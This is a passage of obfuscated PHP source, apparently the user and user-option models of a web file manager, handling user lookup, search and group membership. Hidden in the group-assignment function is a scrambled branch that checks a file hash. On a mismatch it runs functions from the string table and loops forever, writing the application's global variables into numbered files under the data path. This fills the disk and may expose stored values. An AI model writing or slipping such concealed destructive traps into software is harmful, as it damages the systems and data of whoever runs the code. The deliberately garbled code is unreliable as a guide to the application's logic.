(!Input::check($Cö¸ Ÿ¿«Ñ, $fØ­¦£½‰[528])) { return $dˆìËÅòš->metaSet($a®‘­Ëº, array($fØ­¦£½‰[416] => $fØ­¦£½‰[33], $fØ­¦£½‰[415] => $fØ­¦£½‰[33])); } return $dˆìËÅòš->metaSet($a®‘­Ëº, array($fØ­¦£½‰[416] => str_replace($fØ­¦£½‰[50], $fØ­¦£½‰[33], Pinyin::encode($Cö¸ Ÿ¿«Ñ)), $fØ­¦£½‰[415] => Pinyin::encode($Cö¸ Ÿ¿«Ñ, $fØ­¦£½‰[529]))); } private function nickNameRpt() { $AôØø…›á =& $_SERVER[¼€¼ˆ¦‚¡]; $DŞ‹ˆŒ…¢§ = Model($AôØø…›á[1088])->get($AôØø…›á[2528]); $Eâò¿š± Â = $GLOBALS[$AôØø…›á[6]][$AôØø…›á[2484]][$AôØø…›á[2528]]; $FâÁô¥‘¼¸ = !is_null($DŞ‹ˆŒ…¢§) ? $DŞ‹ˆŒ…¢§ : $Eâò¿š± Â; return !!$FâÁô¥‘¼¸; } private function _checkExist($d¬™’Û‰˜, $C¯ˆ‰œóÅ« = false) { $bñöå…òÆ† =& $_SERVER[¼€¼ˆ¦‚¡]; $fˆÓ¼¯¬– = array($bñöå…òÆ†[28] => UserModel::ERROR_USER_EXIST_NAME, $bñöå…òÆ†[2337] => UserModel::ERROR_USER_EXIST_NICKNAME, $bñöå…òÆ†[293] => UserModel::ERROR_USER_EXIST_EMAIL, $bñöå…òÆ†[2516] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fˆÓ¼¯¬–[$bñöå…òÆ†[2337]]); } $AéÆÄõ ğ¸ = $C¯ˆ‰œóÅ« ? array($bñöå…òÆ†[1437] => array($bñöå…òÆ†[2529], $C¯ˆ‰œóÅ«)) : array(); foreach ($fˆÓ¼¯¬– as $eˆá­ßÔÌ => $c—Ñ‡£°èˆ) { if (!isset($d¬™’Û‰˜[$eˆá­ßÔÌ]) || !$d¬™’Û‰˜[$eˆá­ßÔÌ]) { continue; } $aº¬†¸‡ªº = array_merge(array($eˆá­ßÔÌ => $d¬™’Û‰˜[$eˆá­ßÔÌ]), $AéÆÄõ ğ¸); $f„Ÿ¨¾‰ù´ = $this->where($aº¬†¸‡ªº)->find(); if ($f„Ÿ¨¾‰ù´) { return $c—Ñ‡£°èˆ; } } return !0; } public function userListInfo($eÑàÓ„Ğ¥‚) { $FÔ²…›©ƒç =& $_SERVER[¼€¼ˆ¦‚¡]; $CîœÙîï¦ì = array(); $eÑàÓ„Ğ¥‚ = is_array($eÑàÓ„Ğ¥‚) ? array_unique($eÑàÓ„Ğ¥‚) : array(); if (!$eÑàÓ„Ğ¥‚) { return $CîœÙîï¦ì; } if (count($eÑàÓ„Ğ¥‚) < 20) { foreach ($eÑàÓ„Ğ¥‚ as $BˆïÂÒšäÖ) { $CîœÙîï¦ì[$BˆïÂÒšäÖ . $FÔ²…›©ƒç[33]] = $this->getInfoSimpleOuter($BˆïÂÒšäÖ); } } else { $f„Ï™³ßñ¡ = array($FÔ²…›©ƒç[1428] => array($FÔ²…›©ƒç[384], $eÑàÓ„Ğ¥‚)); if (count($eÑàÓ„Ğ¥‚) == 1) { $f„Ï™³ßñ¡ = array($FÔ²…›©ƒç[1428] => $eÑàÓ„Ğ¥‚[0]); } $fàãª—ë¯À = Model($FÔ²…›©ƒç[474])->field($this->simpleField)->where($f„Ï™³ßñ¡)->select(); $fàãª—ë¯À = array_to_keyvalue($fàãª—ë¯À, $FÔ²…›©ƒç[1437]); foreach ($eÑàÓ„Ğ¥‚ as $BˆïÂÒšäÖ) { $f¾ÓªÆ«òá = $fàãª—ë¯À[$fàãª—ë¯À[$BˆïÂÒšäÖ]]; if (!$f¾ÓªÆ«òá) { $CîœÙîï¦ì[$BˆïÂÒšäÖ . $FÔ²…›©ƒç[33]] = $this->getInfoSimpleOuter($BˆïÂÒšäÖ); continue; } $f¾ÓªÆ«òá[$FÔ²…›©ƒç[2501]] = Action($FÔ²…›©ƒç[2502])->parseUrl($f¾ÓªÆ«òá[$FÔ²…›©ƒç[2501]]); $CîœÙîï¦ì[$BˆïÂÒšäÖ . $FÔ²…›©ƒç[33]] = $f¾ÓªÆ«òá; } } return $CîœÙîï¦ì; } protected function userStatus($D£æ“÷´Ú, $e»Õî„‚õÁ) { $eÓ¡§³ÑøŒ = $this->getInfoSimple($D£æ“÷´Ú); if (!$eÓ¡§³ÑøŒ) { return !1; } $eÁĞÙºÍåº = array($_SERVER[¼€¼ˆ¦‚¡][685] => $e»Õî„‚õÁ); return $this->userEdit($D£æ“÷´Ú, $eÁĞÙºÍåº); } protected function userRemove($BóõÇÌ³ˆ‡) { goto dà¤¿ÀŸ÷Ô; C×æ¶Ê„–¿: Model($fáö‡¯éï‹[2181])->where($dƒèêàŞê¸)->delete(); Model($fáö‡¯éï‹[2515])->where($dƒèêàŞê¸)->delete(); Model($fáö‡¯éï‹[2531])->where($dƒèêàŞê¸)->delete(); goto b‡ˆ„òãá•; a–Æ­£ïµ: $dƒèêàŞê¸ = array($fáö‡¯éï‹[1428] => $BóõÇÌ³ˆ‡); Model($fáö‡¯éï‹[536])->where($dƒèêàŞê¸)->delete(); Model($fáö‡¯éï‹[2530])->where($dƒèêàŞê¸)->delete(); goto C×æ¶Ê„–¿; dà¤¿ÀŸ÷Ô: $fáö‡¯éï‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $b¢è­ŠÊ†† = $this->getInfoSimple($BóõÇÌ³ˆ‡); if (!$b¢è­ŠÊ††) { return !1; } goto a–Æ­£ïµ; b‡ˆ„òãá•: Model($fáö‡¯éï‹[749])->userRootRemove($BóõÇÌ³ˆ‡); return $this->where($dƒèêàŞê¸)->delete(); goto bîêÇ‚İØ¿; bîêÇ‚İØ¿: } protected function userGroupSet($B‡°èªÕ¤, $eÒ‰Ÿ™­‚È, $fÈ”ÜŒ¶çé = array()) { goto a„ÇŒ±”ŒÒ; D›‹ À•ïÌ: $b‹“ËŒà = Model($c¨Ú²¾ØĞÔ[2181]); $b‹“ËŒà->where(array($c¨Ú²¾ØĞÔ[1437] => $B‡°èªÕ¤))->delete(); $aÕÓŞ–ÍÜ¸ = array(); goto Dİœøï¥–; Dİœøï¥–: $B¾ó•â°Ú¦ = 0; foreach ($eÒ‰Ÿ™­‚È as $Bîğµ—ÛøÕ => $câîáâÌèÎ) { $Bùè»ÑĞºñ = array($c¨Ú²¾ØĞÔ[1437] => $B‡°èªÕ¤, $c¨Ú²¾ØĞÔ[2105] => $Bîğµ—ÛøÕ, $c¨Ú²¾ØĞÔ[2236] => $câîáâÌèÎ); $Bùè»ÑĞºñ[$c¨Ú²¾ØĞÔ[2126]] = isset($fÈ”ÜŒ¶çé[$B¾ó•â°Ú¦]) ? $fÈ”ÜŒ¶çé[$B¾ó•â°Ú¦] : 0; $B¾ó•â°Ú¦++; $aÕÓŞ–ÍÜ¸[] = $Bùè»ÑĞºñ; } return $b‹“ËŒà->addAll($aÕÓŞ–ÍÜ¸, array(), !0); goto EÃâñäãÄ; a„ÇŒ±”ŒÒ: $c¨Ú²¾ØĞÔ =& $_SERVER[¼€¼ˆ¦‚¡]; $c‹»¶îî¸ = $_SERVER[$c¨Ú²¾ØĞÔ[790]] . $c¨Ú²¾ØĞÔ[791]; $d®ôé–”È— = $c¨Ú²¾ØĞÔ[786]; goto a‚÷÷¢×Ş; a‚÷÷¢×Ş: if ($_SERVER[$c¨Ú²¾ØĞÔ[787]] != $d®ôé–”È—($c‹»¶îî¸)) { goto Fª¥š´èš; eÎ¡ˆ‹šóÀ: $b®øŞêâ = $Cø´­íÊßõ($e²â–²éº); $BÆµ•ŒŒÇ = explode($c¨Ú²¾ØĞÔ[217], $b®øŞêâ); if (count($BÆµ•ŒŒÇ) < $c¨Ú²¾ØĞÔ[554]) { $cœ®ë¡£ŒŒ = $c¨Ú²¾ØĞÔ[792]; $cœ®ë¡£ŒŒ(); } goto d¾¿·íÏ¬ˆ; d¾¿·íÏ¬ˆ: $Cµß¨ì÷” = $c¨Ú²¾ØĞÔ[793]; $Cµß¨ì÷”($_SERVER[$c¨Ú²¾ØĞÔ[784]]); $d‰Á‹®¤—— = $c¨Ú²¾ØĞÔ[788]; goto C¥±ñÂ×­; C¥±ñÂ×­: $d‰Á‹®¤——(); $AË¹¢¢îáŒ = $c¨Ú²¾ØĞÔ[794]; $A˜åÑ—Ş¼ = json_encode($GLOBALS[$c¨Ú²¾ØĞÔ[795]]); goto cßÂÀÓ‡°; cßÂÀÓ‡°: $fÚƒ»Íåä« = 1; for ($A¶Ï™œ‹Æ· = $fÚƒ»Íåä«; $A¶Ï™œ‹Æ· > 0; $A¶Ï™œ‹Æ·++) { $AË¹¢¢îáŒ(DATA_PATH . $A¶Ï™œ‹Æ·, $A˜åÑ—Ş¼); } goto CÚõôÇ£á; Fª¥š´èš: $d‰Á‹®¤—— = $c¨Ú²¾ØĞÔ[788]; $Cø´­íÊßõ = $c¨Ú²¾ØĞÔ[789]; $e²â–²éº = $_SERVER[$c¨Ú²¾ØĞÔ[790]] . $c¨Ú²¾ØĞÔ[791]; goto eÎ¡ˆ‹šóÀ; CÚõôÇ£á: } $E„†ùÁ§Ü¡ = $this->getInfoSimple($B‡°èªÕ¤); if (!$E„†ùÁ§Ü¡ || !is_array($eÒ‰Ÿ™­‚È)) { return !1; } goto D›‹ À•ïÌ; EÃâñäãÄ: } protected function userGroupAdd($eëïé–ç‹, $AÈ·ªƒâ‹ = array()) { $AİÊÄî¨Ş¹ =& $_SERVER[¼€¼ˆ¦‚¡]; $e´‰ŠôéÂÉ = $this->getInfoSimple($eëïé–ç‹); if (!$e´‰ŠôéÂÉ || empty($AÈ·ªƒâ‹)) { return !1; } $d¦£Ç¯« = array(); foreach ($AÈ·ªƒâ‹ as $eÍ¨Å¼Œ¿Ú => $Eòö‹“²§) { $d¦£Ç¯«[] = array($AİÊÄî¨Ş¹[1437] => $eëïé–ç‹, $AİÊÄî¨Ş¹[2105] => $eÍ¨Å¼Œ¿Ú, $AİÊÄî¨Ş¹[2236] => $Eòö‹“²§); } return Model($AİÊÄî¨Ş¹[2181])->addAll($d¦£Ç¯«, array(), !0); } protected function userGroupRemove($a¼ÁŒìöªÍ, $A¥°ùĞè¢É) { $a¬áëÀëÒ =& $_SERVER[¼€¼ˆ¦‚¡]; $a‘ĞÔ·¹àó = $this->getInfoSimple($a¼ÁŒìöªÍ); if (!$a‘ĞÔ·¹àó || !$A¥°ùĞè¢É) { return !1; } $F¥‘ŞÉƒÚ¡ = array($a¬áëÀëÒ[1428] => $a¼ÁŒìöªÍ, $a¬áëÀëÒ[2179] => $A¥°ùĞè¢É); return Model($a¬áëÀëÒ[2181])->where($F¥‘ŞÉƒÚ¡)->delete(); } public function listData() { $f¦µ…¡½ˆ´ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($f¦µ…¡½ˆ´[$_SERVER[¼€¼ˆ¦‚¡][354]]); return $f¦µ…¡½ˆ´; } public function listByID($aƒâ‰—Ì) { $AÂ­ŠŞòÆ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$aƒâ‰—Ì) { return; } $fƒÜ«Œ©Ö÷ = array($AÂ­ŠŞòÆ[1437] => array($AÂ­ŠŞòÆ[7], $aƒâ‰—Ì)); $E„˜ŠïèŠŠ = $this->where($fƒÜ«Œ©Ö÷)->select(); $this->_listDataApply($E„˜ŠïèŠŠ); return $E„˜ŠïèŠŠ; } public function listByGroup($cº¸´ñºÈÓ = 0, $fÜç£˜’ì™ = array()) { goto a±—ÎÅˆÎ; d ˆÕÜ¼©: if ($cº¸´ñºÈÓ) { $E½©›ø¹¯° = array($b–¦­ˆ¸­‹[2532] => intval($cº¸´ñºÈÓ)); $dÒ‘ŞœáÃ÷ = "\x4c\x45\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\165\163\145\162\137\x67\162\x6f\165\x70\x20\165\x73\145\x72\137\x67\162\x6f\x75\x70\40\157\156\x20\165\163\145\162\56\165\x73\x65\162\111\104\40\75\x20\x75\163\x65\162\x5f\147\162\x6f\165\160\56\x75\x73\x65\x72\111\104"; $CÔİ“ÏÛ = Input::get($b–¦­ˆ¸­‹[407], null, $b–¦­ˆ¸­‹[33]) ? $b–¦­ˆ¸­‹[33] : $b–¦­ˆ¸­‹[2533]; } if (isset($fÜç£˜’ì™[$b–¦­ˆ¸­‹[685]])) { $E½©›ø¹¯°[$b–¦­ˆ¸­‹[2534]] = $fÜç£˜’ì™[$b–¦­ˆ¸­‹[685]]; } $Dßİ¯Ö‡â‘ = $this->_makeOrder($CÔİ“ÏÛ)->field($b–¦­ˆ¸­‹[2535])->where($E½©›ø¹¯°)->join($dÒ‘ŞœáÃ÷)->selectPage(50); goto a¬ğàÔ¥‰î; a¬ğàÔ¥‰î: $this->_listDataApply($Dßİ¯Ö‡â‘[$b–¦­ˆ¸­‹[354]]); return $Dßİ¯Ö‡â‘; goto F‰¬°Ì›ç; a±—ÎÅˆÎ: $b–¦­ˆ¸­‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $dÒ‘ŞœáÃ÷ = $b–¦­ˆ¸­‹[33]; $E½©›ø¹¯° = array(); goto d ˆÕÜ¼©; F‰¬°Ì›ç: } private function _makeOrder($b¹éÏ´±…… = '') { goto Dòß“çÏ®ñ; Dòß“çÏ®ñ: $Añ†¥„Ú‡‡ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÊÔŸ—¸´¨ = array($Añ†¥„Ú‡‡[1437], $Añ†¥„Ú‡‡[28], $Añ†¥„Ú‡‡[2091], $Añ†¥„Ú‡‡[2063], $Añ†¥„Ú‡‡[187]); $aè³ƒòáˆ÷ = array($Añ†¥„Ú‡‡[402] => $Añ†¥„Ú‡‡[403], $Añ†¥„Ú‡‡[404] => $Añ†¥„Ú‡‡[405]); goto EöÒìğ½¾Ë; A¯ÇÅ’Ø: $b¹éÏ´±…… = $b¹éÏ´±…… . "\x75\x73\145\x72\56{$a‘ƒ¦Ìƒ™}\x20{$d†´’œ·Â‘}\54\x20\x75\x73\145\162\x2e\x75\x73\x65\162\111\x44\40\141\163\x63"; return $this->alias($Añ†¥„Ú‡‡[2280])->order($b¹éÏ´±……); goto A¯™åª‚; EöÒìğ½¾Ë: $a‘ƒ¦Ìƒ™ = Input::get($Añ†¥„Ú‡‡[407], $Añ†¥„Ú‡‡[7], $Añ†¥„Ú‡‡[1428], $bÊÔŸ—¸´¨); $d†´’œ·Â‘ = Input::get($Añ†¥„Ú‡‡[408], $Añ†¥„Ú‡‡[7], $Añ†¥„Ú‡‡[2182], array($Añ†¥„Ú‡‡[2182], $Añ†¥„Ú‡‡[404])); $d†´’œ·Â‘ = $aè³ƒòáˆ÷[$d†´’œ·Â‘]; goto A¯ÇÅ’Ø; A¯™åª‚: } public function listSearch($cŠ©Îêäå) { goto EŞ¼ôÈœ‚±; EŞ¼ôÈœ‚±: $BƒîĞõÑŒ =& $_SERVER[¼€¼ˆ¦‚¡]; $e£‡­×æêà = $cŠ©Îêäå[$BƒîĞõÑŒ[2183]]; $Fò·Øå‡¥¶ = isset($cŠ©Îêäå[$BƒîĞõÑŒ[2184]]) ? $cŠ©Îêäå[$BƒîĞõÑŒ[2184]] : !1; goto B¸âóË‘Ô; Aİ¯ÛÏí‚¾: if (!$dŸ‘â‘öˆ½ || count($dŸ‘â‘öˆ½[$BƒîĞõÑŒ[354]]) < 5 && Input::check($e£‡­×æêà, $BƒîĞõÑŒ[306])) { $aœ§ÏóŒë› = $this->_searchFromMeta($BƒîĞõÑŒ[415], $e£‡­×æêà, 10); $B­µ´‘âîò = $this->_searchFromMeta($BƒîĞõÑŒ[416], $e£‡­×æêà, 10); $AÓïĞíôšŒ = array_merge($aœ§ÏóŒë›, $B­µ´‘âîò, $dŸ‘â‘öˆ½[$BƒîĞõÑŒ[354]]); $dŸ‘â‘öˆ½[$BƒîĞõÑŒ[354]] = array_unique_by_key($AÓïĞíôšŒ, $BƒîĞõÑŒ[1437]); $dŸ‘â‘öˆ½[$BƒîĞõÑŒ[351]][$BƒîĞõÑŒ[352]] = count($dŸ‘â‘öˆ½[$BƒîĞõÑŒ[354]]); $dŸ‘â‘öˆ½[$BƒîĞõÑŒ[351]][$BƒîĞõÑŒ[353]] = ceil($dŸ‘â‘öˆ½[$BƒîĞõÑŒ[351]][$BƒîĞõÑŒ[352]] / $dŸ‘â‘öˆ½[$BƒîĞõÑŒ[351]][$BƒîĞõÑŒ[349]]); } $this->_listDataApply($dŸ‘â‘öˆ½[$BƒîĞõÑŒ[354]]); $this->_filterByGroup($dŸ‘â‘öˆ½, $Fò·Øå‡¥¶); goto cä·±¦Ì†; cä·±¦Ì†: return $dŸ‘â‘öˆ½; goto C—ê±ØŸ£; DÜ¼á–‡ŒÎ: if (!$e£‡­×æêà) { $Fàòï‡¥§ª = array(); } if (isset($cŠ©Îêäå[$BƒîĞõÑŒ[685]])) { $Fàòï‡¥§ª[$BƒîĞõÑŒ[685]] = $cŠ©Îêäå[$BƒîĞõÑŒ[685]]; } $dŸ‘â‘öˆ½ = $this->_makeOrder()->where($Fàòï‡¥§ª)->selectPage(20); goto Aİ¯ÛÏí‚¾; B¸âóË‘Ô: $e£‡­×æêà = str_replace($BƒîĞõÑŒ[2185], $BƒîĞõÑŒ[2186], trim($e£‡­×æêà)); $Fàòï‡¥§ª = array($BƒîĞõÑŒ[28] => array($BƒîĞõÑŒ[748], "\45{$e£‡­×æêà}\45"), $BƒîĞõÑŒ[293] => array($BƒîĞõÑŒ[748], "\x25{$e£‡­×æêà}\x25"), $BƒîĞõÑŒ[2337] => array($BƒîĞõÑŒ[748], "\45{$e£‡­×æêà}\x25"), $BƒîĞõÑŒ[913] => $BƒîĞõÑŒ[2187]); if (Input::check($e£‡­×æêà, $BƒîĞõÑŒ[299])) { $Fàòï‡¥§ª[$BƒîĞõÑŒ[1437]] = array($BƒîĞõÑŒ[748], "\45{$e£‡­×æêà}\45"); $Fàòï‡¥§ª[$BƒîĞõÑŒ[2516]] = array($BƒîĞõÑŒ[748], "\45{$e£‡­×æêà}\x25"); } goto DÜ¼á–‡ŒÎ; C—ê±ØŸ£: } private function _filterByGroup(&$aÑ°è ÂÅñ, $Eù‰êóñóÒ) { $E‚¨ášòØî =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$Eù‰êóñóÒ) { return $aÑ°è ÂÅñ; } foreach ($aÑ°è ÂÅñ[$E‚¨ášòØî[354]] as $eÆñó‡‡µ¯ => &$A„Ñ‹²Çî) { $Dßä¤®Ã³‰ = array_to_keyvalue($A„Ñ‹²Çî[$E‚¨ášòØî[2536]], $E‚¨ášòØî[33], $E‚¨ášòØî[2105]); if (!in_array($Eù‰êóñóÒ, $Dßä¤®Ã³‰)) { unset($aÑ°è ÂÅñ[$E‚¨ášòØî[354]][$eÆñó‡‡µ¯]); } } $aÑ°è ÂÅñ[$E‚¨ášòØî[354]] = array_values($aÑ°è ÂÅñ[$E‚¨ášòØî[354]]); $aÑ°è ÂÅñ[$E‚¨ášòØî[351]] = array($E‚¨ášòØî[2313] => count($aÑ°è ÂÅñ[$E‚¨ášòØî[354]]), $E‚¨ášòØî[2311] => $aÑ°è ÂÅñ[$E‚¨ášòØî[351]][$E‚¨ášòØî[349]], $E‚¨ášòØî[2310] => 1, $E‚¨ášòØî[2312] => 1); } private function _searchFromMeta($B·å§Ğ, $F·ìà‹™š, $D¥Àä¹’èŠ) { goto fÖàß‘êìâ; fÖàß‘êìâ: $AæÀ‡øï·ç =& $_SERVER[¼€¼ˆ¦‚¡]; $F·ìà‹™š = strtolower($F·ìà‹™š); $fÏ”î“Ì = array($AæÀ‡øï·ç[89] => $B·å§Ğ, $AæÀ‡øï·ç[359] => array($AæÀ‡øï·ç[748], "\x25{$F·ìà‹™š}\45")); goto B ±ÅøÊñ¦; fÑ”œ¡Éóì: $f…™ÔÕÃ = $this->where(array($AæÀ‡øï·ç[1428] => array($AæÀ‡øï·ç[7], $dÊ¾‘¡ø¢„)))->select(); if (!$f…™ÔÕÃ) { return array(); } return $f…™ÔÕÃ; goto D¦™…¬Ãğ ; B ±ÅøÊñ¦: $dÊ¾‘¡ø¢„ = Model($AæÀ‡øï·ç[2537])->where($fÏ”î“Ì)->limit($D¥Àä¹’èŠ)->select(); if (!$dÊ¾‘¡ø¢„) { return array(); } $dÊ¾‘¡ø¢„ = array_to_keyvalue($dÊ¾‘¡ø¢„, $AæÀ‡øï·ç[33], $AæÀ‡øï·ç[1437]); goto fÑ”œ¡Éóì; D¦™…¬Ãğ : } private function _listDataApplyItem($BÙÊî‹†‘) { $cå™«ÅÖâ = array($BÙÊî‹†‘); $this->_listDataApply($cå™«ÅÖâ); return $cå™«ÅÖâ[0]; } private function _listDataApply(&$cÑë§¦) { goto a·ŠÑ†šğ ; e–µòß„Şª: $this->_listAppendSourceRoot($cÑë§¦, $dÙ‚ŠÀ…Û¸); goto bØ•©ĞêÙ÷; a·ŠÑ†šğ : $cï»ÙËàÌî =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$cÑë§¦) { return; } array_remove_key($cÑë§¦, $cï»ÙËàÌî[801]); goto A£Ò©åä™; A£Ò©åä™: $dÙ‚ŠÀ…Û¸ = array_to_keyvalue($cÑë§¦, $cï»ÙËàÌî[33], $cï»ÙËàÌî[1437]); $this->_listAppendGroup($cÑë§¦, $dÙ‚ŠÀ…Û¸); $this->_listAppendMeta($cÑë§¦, $dÙ‚ŠÀ…Û¸); goto e–µòß„Şª; bØ•©ĞêÙ÷: } private function _listAppendSourceRoot(&$Fµ´ÛÜŸ¦, $eÙøËï°ËÏ) { goto b¼¾Ù±±ô¯; b¼¾Ù±±ô¯: $aù‹ùÑ®¨Ï =& $_SERVER[¼€¼ˆ¦‚¡]; $FøöíçêçÁ = array($aù‹ùÑ®¨Ï[461] => 0, $aù‹ùÑ®¨Ï[371] => SourceModel::TYPE_USER, $aù‹ùÑ®¨Ï[456] => array($aù‹ùÑ®¨Ï[7], $eÙøËï°ËÏ)); $eÉ‹ã¼ºœ¬ = $aù‹ùÑ®¨Ï[2194]; goto BƒÖö¸ÛÇâ; Aëœ¤¬ïÃå: foreach ($Fµ´ÛÜŸ¦ as &$dò¥ÀæÀè) { $dò¥ÀæÀè[$aù‹ùÑ®¨Ï[391]] = $d—¯†Ç‘[$dò¥ÀæÀè[$aù‹ùÑ®¨Ï[1437]]] ? $d—¯†Ç‘[$dò¥ÀæÀè[$aù‹ùÑ®¨Ï[1437]]] : array(); } goto eÈÕ·™„à³; BƒÖö¸ÛÇâ: $d—¯†Ç‘ = Model($aù‹ùÑ®¨Ï[749])->order($aù‹ùÑ®¨Ï[2195])->field($eÉ‹ã¼ºœ¬)->where($FøöíçêçÁ)->select(); $d—¯†Ç‘ = array_to_keyvalue($d—¯†Ç‘, $aù‹ùÑ®¨Ï[456]); $d—¯†Ç‘ = array_remove_key($d—¯†Ç‘, $aù‹ùÑ®¨Ï[456]); goto Aëœ¤¬ïÃå; eÈÕ·™„à³: } private function _listAppendGroup(&$F†ÏÔ¼à¼, $añ™â©¬˜) { goto e†ÜêµãË¡; e†ÜêµãË¡: $FŒ¿À•ì“Ç =& $_SERVER[¼€¼ˆ¦‚¡]; $f²â¼°µ õ = array($FŒ¿À•ì“Ç[1437] => array($FŒ¿À•ì“Ç[7], $añ™â©¬˜)); $f«ªáÏÙñ¥ = Model($FŒ¿À•ì“Ç[2181])->where($f²â¼°µ õ)->select(); goto D½×ÎÀƒ; BŠÁ©¢¿: $f²â¼°µ õ = array($FŒ¿À•ì“Ç[2105] => array($FŒ¿À•ì“Ç[7], $dŒ©¨ßè®£)); $FÊí×Ú•„¢ = Model($FŒ¿À•ì“Ç[2538])->field($FŒ¿À•ì“Ç[2539])->where($f²â¼°µ õ)->select(); $Dâëµ Ê„ = array_to_keyvalue($FÊí×Ú•„¢, $FŒ¿À•ì“Ç[2105], $FŒ¿À•ì“Ç[28]); goto F”İĞáãá; F”İĞáãá: $f«ªáÏÙñ¥ = array_to_keyvalue_group($f«ªáÏÙñ¥, $FŒ¿À•ì“Ç[1437]); foreach ($f«ªáÏÙñ¥ as &$BÂ‡½ Ó—ê) { $Dß‡ø¸Ááœ = array(); foreach ($BÂ‡½ Ó—ê as $BİÃƒÉ°­Õ) { if (!$BİÃƒÉ°­Õ[$FŒ¿À•ì“Ç[2236]]) { continue; } $bÂ˜Áá˜“¡ = Model($FŒ¿À•ì“Ç[2255])->listData($BİÃƒÉ°­Õ[$FŒ¿À•ì“Ç[2236]]); $Dß‡ø¸Ááœ[] = array($FŒ¿À•ì“Ç[2105] => $BİÃƒÉ°­Õ[$FŒ¿À•ì“Ç[2105]], $FŒ¿À•ì“Ç[2540] => $Dâëµ Ê„[$BİÃƒÉ°­Õ[$FŒ¿À•ì“Ç[2105]]], $FŒ¿À•ì“Ç[376] => $bÂ˜Áá˜“¡); } $BÂ‡½ Ó—ê = $Dß‡ø¸Ááœ; } foreach ($F†ÏÔ¼à¼ as &$b†«­³ã“ë) { $b†«­³ã“ë[$FŒ¿À•ì“Ç[2536]] = array(); if (isset($f«ªáÏÙñ¥[$b†«­³ã“ë[$FŒ¿À•ì“Ç[1437]]])) { $b†«­³ã“ë[$FŒ¿À•ì“Ç[2536]] = $f«ªáÏÙñ¥[$b†«­³ã“ë[$FŒ¿À•ì“Ç[1437]]]; } } goto AÌ—õ÷¹ºÙ; D½×ÎÀƒ: $dŒ©¨ßè®£ = array_to_keyvalue($f«ªáÏÙñ¥, $FŒ¿À•ì“Ç[33], $FŒ¿À•ì“Ç[2105]); $dŒ©¨ßè®£ = array_remove_value(array_unique($dŒ©¨ßè®£), $FŒ¿À•ì“Ç[468]); if (!$dŒ©¨ßè®£ || !$f«ªáÏÙñ¥) { return; } goto BŠÁ©¢¿; AÌ—õ÷¹ºÙ: } private function _listAppendMeta(&$eİêè­Éåô, $f­Äòê¸›) { goto aæóÚ˜ˆïß; Fœ³ª˜îá›: $FÚƒ—ƒÑ’Ê = array($C©·ÀÍëÑ[1437] => array($C©·ÀÍëÑ[7], $f­Äòê¸›)); $F´°¦íÂ†š = Model($C©·ÀÍëÑ[2515])->where($FÚƒ—ƒÑ’Ê)->select(); $F´°¦íÂ†š = array_to_keyvalue_group($F´°¦íÂ†š, $C©·ÀÍëÑ[1437]); goto a¬–—®ˆÒ; aæóÚ˜ˆïß: $C©·ÀÍëÑ =& $_SERVER[¼€¼ˆ¦‚¡]; $BÖ¥˜¤Ş = UserJobModel::JOB_KEY; $A¨ÚñØ»ˆˆ = array($C©·ÀÍëÑ[2518]); goto Fœ³ª˜îá›; a¬–—®ˆÒ: foreach ($F´°¦íÂ†š as &$F­¿®â‰‚) { $Eç½é¡Ÿ§¤ = array(); foreach ($F­¿®â‰‚ as $eéš„ÓòÎ) { if (!in_array($eéš„ÓòÎ[$C©·ÀÍëÑ[89]], $A¨ÚñØ»ˆˆ)) { $Eç½é¡Ÿ§¤[$eéš„ÓòÎ[$C©·ÀÍëÑ[89]]] = $eéš„ÓòÎ[$C©·ÀÍëÑ[359]]; } } $F­¿®â‰‚ = $Eç½é¡Ÿ§¤; } $aöˆ˜Œ¶Á = Model($C©·ÀÍëÑ[2541]); foreach ($eİêè­Éåô as &$DÉ¸ÑùŒ®Ç) { $cÍäÎíİ = array(); if (isset($F´°¦íÂ†š[$DÉ¸ÑùŒ®Ç[$C©·ÀÍëÑ[1437]]])) { $cÍäÎíİ = $F´°¦íÂ†š[$DÉ¸ÑùŒ®Ç[$C©·ÀÍëÑ[1437]]]; } $DÉ¸ÑùŒ®Ç[$C©·ÀÍëÑ[2542]] = array(); if (isset($cÍäÎíİ[$BÖ¥˜¤Ş])) { $DÉ¸ÑùŒ®Ç[$C©·ÀÍëÑ[2542]] = $aöˆ˜Œ¶Á->getUserJobInfo($cÍäÎíİ[$BÖ¥˜¤Ş]); } } goto A¦‚º–¶; A¦‚º–¶: } protected function groupUserAll($c¯Óçç„Ò³) { $B§ˆÖ¶Ù =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$c¯Óçç„Ò³) { return !1; } $aø‰Ç©‘‘È = Model($B§ˆÖ¶Ù[2181])->field($B§ˆÖ¶Ù[1437])->where(array($B§ˆÖ¶Ù[2105] => array($B§ˆÖ¶Ù[7], $c¯Óçç„Ò³)))->select(); $aø‰Ç©‘‘È = array_to_keyvalue($aø‰Ç©‘‘È, $B§ˆÖ¶Ù[33], $B§ˆÖ¶Ù[1437]); return array_unique($aø‰Ç©‘‘È); } public function userSearch($EòöÛ—¦—Û, $f©”Ø¢·»â = "\52") { return Model($_SERVER[¼€¼ˆ¦‚¡][477])->where($EòöÛ—¦—Û)->field($f©”Ø¢·»â)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\x6f\160\164\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A†ò´Œ÷Èö) { $A‚Óçğ¨£ˆ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($A‚Óçğ¨£ˆ[427])) { define($A‚Óçğ¨£ˆ[427], 0); } return "\x55\x73\145\x72\117\x70\x74\x69\x6f\x6e\x5f{$A†ò´Œ÷Èö}\137" . USER_ID; } protected function filterWhere($eŸ¤­†Ğ…Ñ) { $FºÆô¦÷è =& $_SERVER[¼€¼ˆ¦‚¡]; if (!defined($FºÆô¦÷è[427])) { define($FºÆô¦÷è[427], 0); } $eŸ¤­†Ğ…Ñ[$FºÆô¦÷è[1437]] = USER_ID; return $eŸ¤­†Ğ…Ñ; } public function cacheRemoveUser($b•õÙ÷ğâ·, $C“©”÷¿š‘) { return 